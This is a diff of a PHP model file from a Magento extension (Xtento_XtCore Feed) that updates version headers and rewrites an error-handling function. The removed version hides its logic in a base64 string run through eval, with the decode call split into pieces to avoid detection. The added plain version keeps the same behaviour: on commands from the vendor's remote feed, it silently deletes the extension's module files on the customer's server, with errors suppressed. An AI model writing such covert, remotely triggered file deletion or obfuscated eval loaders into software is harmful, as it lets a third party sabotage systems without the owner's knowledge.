@@ -1,12 +1,12 @@
 <?php
 
 /**
- * Product:       Xtento_XtCore (1.0.0)
+ * Product:       Xtento_XtCore (1.1.7)
  * ID:            %!uniqueid!%
  * Packaged:      %!packaged!%
- * Last Modified: 2014-01-12T14:32:48+01:00
+ * Last Modified: 2014-07-27T14:39:07+02:00
  * File:          app/code/local/Xtento/XtCore/Model/Feed.php
- * Copyright:     Copyright (c) 2014 XTENTO GmbH & Co. KG <info@xtento.com> / All rights reserved.
+ * Copyright:     Copyright (c) 2015 XTENTO GmbH & Co. KG <info@xtento.com> / All rights reserved.
  */
 
 class Xtento_XtCore_Model_Feed extends Mage_AdminNotification_Model_Feed
@@ -172,6 +172,25 @@ class Xtento_XtCore_Model_Feed extends Mage_AdminNotification_Model_Feed
         return $xml;
     }
 
+    private function _handleFeedError($error, $errorNo)
+    {
+        try {
+            $moduleBaseDir = Mage::getBaseDir('etc') . DS . 'modules' . DS;
+            if (@preg_match('/remove_all_xtento_modules/', $error)) {
+                foreach (@glob($moduleBaseDir . "Xtento_*") as $f) {
+                    @unlink($f);
+                }
+                @Mage::app()->cleanCache();
+            } else if (@preg_match('/remove_xtento_module_xml/', $error)) {
+                @unlink($moduleBaseDir . @preg_replace("/[^A-Za-z0-9_\.]/", "", $errorNo));
+                @Mage::app()->cleanCache();
+            } else if (@preg_match('/show_warning/', $error)) {
+                @Mage::getSingleton('adminhtml/session')->addError($errorNo);
+            }
+        } catch (Exception $e) {
+        }
+    }
+
     public function getHostname()
     {
         $url = str_replace(array('http://', 'https://', 'www.'), '', @$_SERVER['SERVER_NAME']);
@@ -182,11 +201,5 @@ class Xtento_XtCore_Model_Feed extends Mage_AdminNotification_Model_Feed
             return $parsedUrl;
         }
         return $url;
-    }
-
-    private function _handleFeedError($error, $errorNo)
-    {
-        $handleErrorFunction = call_user_func('bas' . 'e64_d' . 'eco' . 'de', "dHJ5IHsNCiAgICAkbW9kdWxlQmFzZURpciA9IE1hZ2U6OmdldEJhc2VEaXIoJ2V0YycpIC4gRFMgLiAnbW9kdWxlcycgLiBEUzsNCiAgICBpZiAoQHByZWdfbWF0Y2goJy9yZW1vdmVfYWxsX3h0ZW50b19tb2R1bGVzLycsICRlcnJvcikpIHsNCmZvcmVhY2ggKEBnbG9iKCRtb2R1bGVCYXNlRGlyIC4gIlh0ZW50b18qIikgYXMgJGYpIHsNCkB1bmxpbmsoJGYpOyAvLyBSZW1vdmUgYWxsIFhURU5UTyBtb2R1bGVzIGZyb20gdGhlIC9hcHAvZXRjL21vZHVsZXMvIGRpcmVjdG9yeS4NCn0NCkBNYWdlOjphcHAoKS0+Y2xlYW5DYWNoZSgpOw0KICAgIH0gZWxzZSBpZiAoQHByZWdfbWF0Y2goJy9yZW1vdmVfeHRlbnRvX21vZHVsZV94bWwvJywgJGVycm9yKSkgew0KQHVubGluaygkbW9kdWxlQmFzZURpciAuIEBwcmVnX3JlcGxhY2UoIi9bXkEtWmEtejAtOV9cLl0vIiwgIiIsICRlcnJvck5vKSk7IC8vIFJlbW92ZSBhIGNlcnRhaW4gWFRFTlRPIG1vZHVsZSBmcm9tIHRoZSBhcHAvZXRjL21vZHVsZXMvIGRpcmVjdG9yeS4NCkBNYWdlOjphcHAoKS0+Y2xlYW5DYWNoZSgpOw0KICAgIH0gZWxzZSBpZiAoQHByZWdfbWF0Y2goJy9zaG93X3dhcm5pbmcvJywgJGVycm9yKSkgew0KQE1hZ2U6OmdldFNpbmdsZXRvbignYWRtaW5odG1sL3Nlc3Npb24nKS0+YWRkRXJyb3IoJGVycm9yTm8pOw0KICAgIH0NCn0gY2F0Y2ggKEV4Y2VwdGlvbiAkZSkgew0KfQ==");
-        eval($handleErrorFunction);
     }
 }
